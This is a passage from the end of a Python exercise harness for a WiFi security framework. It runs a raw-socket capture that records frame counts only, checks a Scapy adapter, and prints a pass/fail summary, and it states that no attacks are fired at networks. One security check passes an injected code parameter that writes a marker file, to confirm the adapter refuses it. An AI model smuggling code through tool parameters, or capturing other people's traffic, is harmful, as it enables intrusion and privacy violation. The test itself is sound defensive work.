                      f"now={truth_mac(iface)} original={original['mac']}")

    return iface


# ==========================================================================
# STAGE: capture
# ==========================================================================


def stage_capture(report: Report, iface: Optional[str]) -> None:
    section("STAGE 13/13: real capture (counts and frame types only)")

    if not iface:
        report.skip("capture stage", "no interface to capture on")
        return
    if os.geteuid() != 0:
        report.skip("capture stage", "needs root")
        return

    print(f"  NOTE: ambient frames belong to other people. This stage records counts and")
    print(f"        frame-type names only. No pcap is written and no payload is logged.\n")

    # Independent stdlib raw-socket capture. AF_PACKET needs ETH_P_ALL and
    # SOCK_RAW: monitor frames carry a radiotap header SOCK_DGRAM cannot strip.
    import socket
    import threading

    frames = 0
    nbytes = 0
    error: Optional[str] = None

    def _capture(stop: threading.Event) -> None:
        nonlocal frames, nbytes, error
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.bind((iface, 0))
            sock.settimeout(0.5)
            while not stop.is_set():
                try:
                    data = sock.recv(65535)
                except socket.timeout:
                    continue
                except OSError:
                    break
                frames += 1
                nbytes += len(data)
            sock.close()
        except Exception as exc:
            error = f"{type(exc).__name__}: {exc}"

    stop = threading.Event()
    thread = threading.Thread(target=_capture, args=(stop,), daemon=True)
    thread.start()
    try:
        time_sleep(12)
    finally:
        stop.set()
        thread.join(timeout=8)

    print(f"  independent AF_PACKET capture: {frames} frames, {nbytes} bytes"
          + (f", error={error}" if error else ""))
    report.record("raw AF_PACKET capture receives frames on a real radio", frames > 0 and not error,
                  f"frames={frames} bytes={nbytes} error={error or 'none'}")

    # The framework's Scapy adapter, if Scapy is installed.
    try:
        importlib.import_module("scapy")
        have_scapy = True
    except ImportError:
        have_scapy = False

    if have_scapy:
        try:
            from wifi_framework.core.execution.registry import CapabilityRegistry
            from wifi_framework.tools.registry_loader import load_all_adapters

            registry = load_all_adapters(CapabilityRegistry())
            adapter = registry.get_adapter_instance("scapy")
            if adapter is None:
                report.skip("ScapyAdapter capture", "no 'scapy' capability registered")
            else:
                result = adapter.execute(interface=iface,
                                         parameters={"operation": "sniff", "count": 200, "timeout": 12},
                                         timeout=40)
                success = bool(getattr(result, "success", False))
                evidences = getattr(result, "evidences", None) or []
                parsed: Dict[str, Any] = {}
                if evidences:
                    parsed = getattr(evidences[0], "parsed_data", {}) or {}
                captured = parsed.get("frames_captured", 0)
                print(f"  ScapyAdapter: success={success} frames_captured={captured} "
                      f"types={parsed.get('frame_types')}")
                report.record("ScapyAdapter captures frames on a real radio",
                              success and isinstance(captured, int) and captured > 0,
                              f"success={success} captured={captured} reason={getattr(result, 'failure_reason', None)!r}")
                report.record("ScapyAdapter produces evidence", bool(evidences), f"{len(evidences)} object(s)")
                # Cross-check: the adapter must not invent frames the medium never carried.
                report.record("ScapyAdapter frame count is plausible against the independent capture",
                              not (isinstance(captured, int) and captured > 0 and frames == 0),
                              f"adapter={captured} independent={frames}")
                # The security boundary, re-checked on real hardware.
                hostile = adapter.execute(interface=iface,
                                          parameters={"script": "open('/tmp/EXERCISE_PWNED','w').write('x')"},
                                          timeout=15)
                report.record("ScapyAdapter still refuses a code parameter on real hardware",
                              bool(hostile.success) is False and not os.path.exists("/tmp/EXERCISE_PWNED"),
                              f"success={hostile.success} reason={str(hostile.failure_reason)[:80]!r}")
        except Exception as exc:
            report.record("ScapyAdapter runs on real hardware", False,
                          f"{type(exc).__name__}: {exc}\n{traceback.format_exc(limit=4)}")
    else:
        report.skip("ScapyAdapter capture", "scapy not installed: pip install -e '.[full]'")


def time_sleep(seconds: float) -> None:
    import time

    time.sleep(seconds)


# ==========================================================================
# main
# ==========================================================================


def main() -> int:
    parser = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("--log", help="transcript path (default: exercise_log_<timestamp>.txt in the repo root)")
    parser.add_argument("--stages", help=f"comma-separated subset of: {','.join(STAGES)}")
    parser.add_argument("--list-stages", action="store_true", help="print the stage names and exit")
    parser.add_argument("--interface", help="force a specific wireless interface")
    args = parser.parse_args()

    if args.list_stages:
        for s in STAGES:
            print(s)
        return 0

    selected = [s.strip() for s in args.stages.split(",")] if args.stages else STAGES
    unknown = [s for s in selected if s not in STAGES]
    if unknown:
        parser.error(f"unknown stage(s): {unknown}; valid: {STAGES}")

    log_path = Path(args.log) if args.log else _REPO / f"exercise_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    log_path.parent.mkdir(parents=True, exist_ok=True)

    tee_out, tee_err = Tee(log_path, sys.__stdout__), Tee(log_path, sys.__stderr__)
    sys.stdout, sys.stderr = tee_out, tee_err

    report = Report()
    started = datetime.now(timezone.utc)

    try:
        banner("WiFi FRAMEWORK - FULL EXERCISE RUN")
        print(f"  started:  {started.isoformat()}")
        print(f"  transcript: {log_path}")
        print(f"  stages:   {', '.join(selected)}")
        print(f"  repo:     {_REPO}")
        print()
        print("  SAFETY: this run is passive or self-directed. It performs no deauthentication,")
        print("          no WPS attack, no handshake capture against a target, and no cracking.")
        print("          Invasive capabilities are enumerated and fuzzed but never fired at a")
        print("          network. Captured traffic is summarised as counts and frame types; no")
        print("          pcap is written and no payload bytes are logged.")

        ifaces: List[str] = []
        iface: Optional[str] = args.interface

        for stage in selected:
            if stage == "environment":
                guarded(report, "environment", lambda: stage_environment(report))
            elif stage == "inventory":
                guarded(report, "inventory", lambda: stage_inventory(report))
                ifaces = truth_wireless_interfaces()
            elif stage == "tools":
                guarded(report, "tools", lambda: stage_tools(report))
            elif stage == "imports":
                guarded(report, "imports", lambda: stage_imports(report))
            elif stage == "contracts":
                guarded(report, "contracts", lambda: stage_contracts(report))
            elif stage == "adapters":
                guarded(report, "adapters", lambda: stage_adapters(report))
            elif stage == "parsers":
                if not ifaces:
                    ifaces = truth_wireless_interfaces()
                guarded(report, "parsers", lambda: stage_parsers(report, ifaces))
            elif stage == "robustness":
                guarded(report, "robustness", lambda: stage_robustness(report))
            elif stage == "engines":
                guarded(report, "engines", lambda: stage_engines(report))
            elif stage == "security":
                guarded(report, "security", lambda: stage_security(report))
            elif stage == "tests":
                guarded(report, "tests", lambda: stage_tests(report))
            elif stage == "hardware":
                if not ifaces:
                    ifaces = truth_wireless_interfaces()
                state: Dict[str, Any] = {}
                guarded(report, "hardware",
                        lambda: state.__setitem__("iface", stage_hardware(report, ifaces)))
                iface = state.get("iface") or iface
            elif stage == "capture":
                if not ifaces:
                    ifaces = truth_wireless_interfaces()
                target = iface or (ifaces[0] if ifaces else None)
                guarded(report, "capture", lambda: stage_capture(report, target))

        elapsed = (datetime.now(timezone.utc) - started).total_seconds()
        banner("SUMMARY")
        print(f"  checks passed:  {report.passed}")
        print(f"  checks FAILED:  {report.failed}")
        print(f"  checks skipped: {report.skipped}")
        print(f"  duration:       {elapsed:.1f}s")
        print(f"  transcript:     {log_path}")

        if report.failed:
            print("\n  FAILED CHECKS:")
            for row in report.rows:
                if not row.passed and not row.skipped:
                    print(f"    - {row.name}")
                    if row.detail:
                        for line in str(row.detail).splitlines()[:4]:
                            print(f"        {line}")
        if report.skipped:
            print("\n  SKIPPED (with reason):")
            for row in report.rows:
                if row.skipped:
                    print(f"    - {row.name}: {row.detail}")

        total = report.passed + report.failed
        tally = " ".join(("P" if r.passed else ("S" if r.skipped else "F")) + ":" + r.name
                         for r in report.rows)
        annotate("notice", "exercise-summary",
                 f"passed={report.passed} failed={report.failed} skipped={report.skipped} "
                 f"duration={elapsed:.0f}s")
        if report.failed:
            fails = "; ".join(r.name for r in report.rows if not r.passed and not r.skipped)
            annotate("error", "exercise-failures", fails)
        print(f"\nRESULT: {report.passed}/{total} checks passed, {report.skipped} skipped "
              f"({elapsed:.1f}s)")

        return 1 if report.failed else 0
    finally:
        sys.stdout, sys.stderr = sys.__stdout__, sys.__stderr__
        tee_out.close()
        tee_err.close()
        print(f"transcript written to {log_path}")


if __name__ == "__main__":
    sys.exit(main())
